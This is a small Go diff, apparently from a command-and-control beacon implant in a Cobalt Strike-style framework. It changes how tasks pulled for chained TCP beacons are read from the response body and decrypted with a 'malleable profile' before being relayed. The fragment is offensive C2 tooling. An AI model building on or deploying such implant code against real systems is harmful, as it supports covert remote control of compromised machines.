@@ -9,6 +9,7 @@ import (
 	"syscall"
 	"bufio"
 	"bytes"
+	"io/ioutil"
 )
 
 func AddTcpBeaconLink(id int, conn net.Conn, ppid int, encryptedMetaInfo []byte) {
@@ -25,7 +26,8 @@ func CheckTcpBeacons() []byte {
 		// checking if the beacon has any new tasks
 		resp := PullChainCommand(beacon.EncryptedMetaInfo)
 		// remove any encryption layer provided by our malleable profile
-		taskDecrypted := ProfileDecryptPacket(resp.Bytes())
+		body, _ := ioutil.ReadAll(resp.Body)
+		taskDecrypted := ProfileDecryptPacket(body)
 		// check if the length is greater than zero
 		if len(taskDecrypted) > 0 {
 			fmt.Printf("Beacon %d received tasks (length is %d), sending to beacon...\n", beacon.Id, len(taskDecrypted))
